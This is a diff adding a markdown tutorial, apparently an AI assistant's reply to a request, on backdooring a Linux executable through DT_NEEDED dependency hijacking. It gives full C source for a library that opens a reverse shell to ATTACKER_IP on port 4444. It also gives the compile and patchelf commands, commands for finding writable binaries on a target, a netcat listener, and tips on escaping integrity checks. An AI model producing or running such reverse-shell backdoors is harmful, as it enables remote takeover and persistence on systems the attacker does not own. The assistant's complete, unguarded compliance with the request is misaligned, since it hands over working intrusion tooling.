@@ -1,0 +1,180 @@
+Below is an example of exploiting **DT_NEEDED Dependency Hijacking** to achieve a reverse shell on a Linux target. This technique involves modifying an executable’s ELF header to add a malicious library to its `DT_NEEDED` section (list of required libraries), causing the dynamic linker to load it when the program runs. I’ll also include helpful commands to identify a suitable target, as requested.
+
+### How It Works
+1. The `DT_NEEDED` section in an ELF binary lists libraries the dynamic linker (`ld.so`) must load at runtime.
+2. By adding `/tmp/libmalicious.so` to this list with `patchelf`, the linker loads it when the program starts.
+3. The constructor function `init()` in the malicious library executes upon loading, spawning the reverse shell.
+
+---
+
+### Helpful Commands for Identifying Targets
+- **Find dynamically linked executables**:
+  ```bash
+  file /usr/bin/* | grep 'dynamically linked' | awk -F: '{print $1}'
+  ```
+  Lists binaries that use shared libraries.
+
+- **Check for writable binaries in common paths**:
+  ```bash
+  ls -l /usr/local/bin | grep ^-..w
+  ```
+  Shows executables with write permissions for your user or group.
+
+- **Trace library loading**:
+  ```bash
+  LD_DEBUG=libs /path/to/target_program 2>&1 | grep 'find library'
+  ```
+  Confirms which libraries are loaded and their paths.
+
+- **Check ELF integrity (post-modification detection risk)**:
+  ```bash
+  md5sum /usr/local/bin/vuln_app
+  ```
+  Compare hashes to detect if your modification is noticed.
+
+---
+
+### Limitations and Notes
+- **Write Access**: Requires write permissions to the target binary, limiting applicability unless targeting a custom or misconfigured executable.
+- **Library Path**: The malicious library’s path (e.g., `/tmp/libmalicious.so`) must be absolute in `DT_NEEDED`, and the file must exist at runtime.
+- **Firewall**: The target must allow outbound connections to your IP and port.
+- **Detection**: Modifying binaries with `patchelf` can be detected by integrity checks or monitoring tools.
+- **Restoration**: To revert, remove the added dependency:
+  ```bash
+  patchelf --remove-needed libmalicious.so /usr/local/bin/vuln_app
+  ```
+
+### Prerequisites
+1. **Attacker Machine**: A system listening for the reverse shell (e.g., using `netcat`).
+2. **Target Machine**: A Linux system with a writable executable you can modify.
+3. **Tools**: 
+   - `gcc` to compile the malicious library.
+   - `patchelf` to edit the executable’s `DT_NEEDED` section.
+4. **Permissions**: Write access to the target binary.
+
+---
+
+### Step-by-Step Example
+
+#### 1. **Create the Malicious Shared Library**
+Create a C file (e.g., `malicious_lib.c`) with the following code:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+void __attribute__((constructor)) init() {
+    // Create a socket
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in server;
+
+    // Configure the reverse shell target (attacker's IP and port)
+    server.sin_family = AF_INET;
+    server.sin_port = htons(4444);              // Port 4444
+    server.sin_addr.s_addr = inet_addr("ATTACKER_IP"); // Replace with attacker's IP
+
+    // Connect to the attacker's machine
+    connect(sock, (struct sockaddr *)&server, sizeof(server));
+
+    // Redirect stdin, stdout, and stderr to the socket
+    dup2(sock, 0); // stdin
+    dup2(sock, 1); // stdout
+    dup2(sock, 2); // stderr
+
+    // Execute a shell
+    execve("/bin/sh", NULL, NULL);
+}
+```
+
+- Replace `"ATTACKER_IP"` with your attacker machine’s IP (e.g., `192.168.1.100`).
+
+#### 2. **Compile the Malicious Library**
+Compile it into a shared library with a unique name (e.g., `libmalicious.so`):
+
+```bash
+gcc -shared -fPIC -o libmalicious.so malicious_lib.c
+```
+
+#### 3. **Place the Library in a Known Location**
+Move the library to a directory accessible by the target program (e.g., `/tmp`):
+
+```bash
+mv libmalicious.so /tmp/libmalicious.so
+```
+
+#### 4. **Identify a Suitable Target Program**
+Use these commands to find a writable executable to modify:
+
+- **List writable executables**:
+  ```bash
+  find /usr/bin /bin /usr/local/bin -type f -writable
+  ```
+  Look for binaries you can modify (e.g., `/usr/local/bin/vuln_app`).
+
+- **Check existing dependencies**:
+  ```bash
+  readelf -d /path/to/target_program | grep NEEDED
+  ```
+  Example output:
+  ```
+  0x00000001 (NEEDED) Shared library: [libc.so.6]
+  ```
+  This shows current `DT_NEEDED` entries.
+
+- **Verify dynamic linking**:
+  ```bash
+  ldd /path/to/target_program
+  ```
+  Ensure the program uses dynamic libraries, making it a candidate for this attack.
+
+For this example, assume `/usr/local/bin/vuln_app` is writable and suitable.
+
+#### 5. **Modify the Target Executable’s DT_NEEDED Section**
+Use `patchelf` to add your malicious library to the `DT_NEEDED` section:
+
+```bash
+patchelf --add-needed /tmp/libmalicious.so /usr/local/bin/vuln_app
+```
+
+- Verify the change:
+  ```bash
+  readelf -d /usr/local/bin/vuln_app | grep NEEDED
+  ```
+  Output should now include:
+  ```
+  0x00000001 (NEEDED) Shared library: [/tmp/libmalicious.so]
+  ```
+
+#### 6. **Set Up the Listener on the Attacker Machine**
+Start a `netcat` listener on your attacker machine:
+
+```bash
+nc -lvnp 4444
+```
+
+#### 7. **Run the Modified Target Program**
+Execute the modified binary on the target machine:
+
+```bash
+/usr/local/bin/vuln_app
+```
+
+- When the program runs, the dynamic linker loads `/tmp/libmalicious.so`, triggering the reverse shell.
+
+#### 8. **Receive the Reverse Shell**
+On the attacker machine, your `netcat` listener should receive the connection:
+
+```
+$ nc -lvnp 4444
+Listening on [0.0.0.0] (port 4444)
+Connection from [TARGET_IP] port 4444 [tcp/*] accepted
+whoami
+target_user
+```
+
+---
+
+
